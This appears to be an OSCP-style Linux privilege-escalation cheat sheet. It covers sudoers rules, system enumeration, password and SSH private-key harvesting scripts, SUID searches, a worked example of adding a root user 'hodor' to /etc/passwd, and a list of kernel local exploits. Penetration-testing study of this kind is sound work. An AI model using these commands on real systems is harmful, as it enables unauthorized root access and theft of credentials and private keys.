# Linux

### Sudo

```text
cat /etc/sudoers
sudo -l
```

Becoming a super hero is a fairly straight forward process:

```
root ALL=(ALL) ALL
```

{% hint style="info" %}
The root user can execute from ALL terminals, acting as ALL \(any\) users, and run ALL \(any\) command.
{% endhint %}

```text
john ALL= /sbin/poweroff
```

{% hint style="info" %}
The user john can from any terminal, run the command power off using john's user password.
{% endhint %}

```text
john ALL = (root) NOPASSWD: /usr/bin/scp
```

{% hint style="info" %}
The user john can from any terminal, run the command scp as root user without password.
{% endhint %}

Below a selection of [gotmi1k's privesc blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) which I use a lot.

### Distribution type & kernel version

```text
cat /etc/*release*
uname -a
rpm -q kernel
dmesg | grep -i linux
```

### Default writeable directory / folder

```text
/tmp
/dev/shm
```

### Search for passwords

Search for password within config.php

```text
grep -R 'password' config.php
```

Search at whole system

```text
find / -type f -exec grep -H 'password' {} \; 2>/dev/null
grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)
```

Moaaar grepping

```text
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```

### Find possible other writeable directory / folder

```text
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```

### Service\(s\) running as root user

```text
ps aux | grep root
ps -ef | grep root
```

### Installed applications

```text
ls -lah /usr/bin/
ls -lah /sbin/
dpkg -l
rpm -qa
ls -lah /var/cache/apt/archivesO
ls -lah /var/cache/yum/
```

### Scheduled jobs

```text
crontab -l
ls -la /etc/cron*
ls -lah /var/spool/cron
ls -la /etc/ | grep cron
cat /etc/crontab
cat /etc/anacrontab
```

### Search for juicy shizzle

#### Find pattern in file:

```text
grep -rnw '/etc/passwd' -e 'root'
```

#### SSH

[https://www.ssh.com/ssh/](https://www.ssh.com/ssh/)

#### Host keys

**authorized\_keys**  
Contains the signature of the public key of any authorised client\(s\), in other words specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file lets the server authenticate the user.

**id\_rsa**  
Contains the private key for the client. This RSA key can be used with SSH protocols 1 or 2.

**id\_rsa.pub**  
Contains the public key for the client

**id\_dsa**  
Contains the private key for the client. This \(insecure\) DSA key only can be used with SSH protocol 2.

**id\_dsa.pub**  
Contains the public key for the client

**known\_hosts**  
Contains a list of host signatures for hosts the client has ever connected to.

#### Search for RSA private keys

```text
#!/bin/bash
for X in $(cut -f6 -d ':' /etc/passwd |sort |uniq); do
    if [ -s "${X}/.ssh/id_rsa" ]; then
        echo "### ${X}: "
        cat "${X}/.ssh/id_rsa"
        echo ""
    fi
done
```

#### Search for DSA private keys

```text
#!/bin/bash
for X in $(cut -f6 -d ':' /etc/passwd |sort |uniq); do
    if [ -s "${X}/.ssh/id_dsa" ]; then
        echo "### ${X}: "
        cat "${X}/.ssh/id_dsa"
        echo ""
    fi
done
```

#### Sticky bit, SGID, SUID, GUID

Sticky bit

```text
find / -perm -1000 -type d 2>/dev/null
```

SGID \(chmod 2000\)

```text
find / -perm -g=s -type f 2>/dev/null
```

SUID \(chmod 4000\)

```text
find / -perm -u=s -type f 2>/dev/null
find /* -user root -perm -4000 -print 2>/dev/null
```

SUID or GUID

```text
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null 
```

#### Example SUID exploitation

The following file has the SUID bit set:

```text
/usr/bin/nano
```

We can use this to execute nano and then add a new root user to /etc/passwd. The next step is to create a password "hodor" with salt "hodor":

```text
perl -e 'print crypt("hodor", "hodor"),"\n"'
```

Add to /etc/passwd using nano:

```text
hodor:how7QNOjM.95M:0:0:root:/root:/bin/bash
```

Switch to new user:

```text
su hodor
```

### Add user to /etc/passwd and root group

```text
echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
```

### Enumeration tools

Linenum.sh  
[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

LinPrivChecker.py   
[https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)

### Linux local exploits

```text
kernel 2.4.x / 2.6.x (sock_sendpage 1)
kernel 2.4 / 2.6 (sock_sendpage 2)
kernel < 2.6.22 (ftruncate)
kernel < 2.6.34 (cap_sys_admin)
kernel 2.6.27 < 2.6.36 (compat)
kernel < 2.6.36-rc1 (can bcm)
kernel <= 2.6.36-rc8 (rds protocol)
kernel < 2.6.36.2 (half nelson)
kernel <= 2.6.37 (full nelson)
kernel 2.6 (udev)
kernel 3.13 (sgid)
kernel 3.13.0 < 3.19 (overlayfs 1)
kernel 3.14.5 (libfutex)
kernel 2.6.39 <= 3.2.2 (mempodipper)
*kernel 2.6.28 / 3.0 (alpha-omega)
kernel 2.6.22 < 3.9 (Dirty Cow)
kernel 3.7.6 (msr)
*kernel < 3.8.9 (perf_swevent_init)
kernel <= 4.3.3 (overlayfs 2)
kernel 4.3.3 (overlayfs 3)
kernel 4.4.0 (af_packet)
kernel 4.4.x (double-fdput)
kernel 4.4.0-21 (netfilter)
kernel 4.4.1 (refcount)
```

### **References**

* [https://oscp.securable.nl/](https://oscp.securable.nl/)

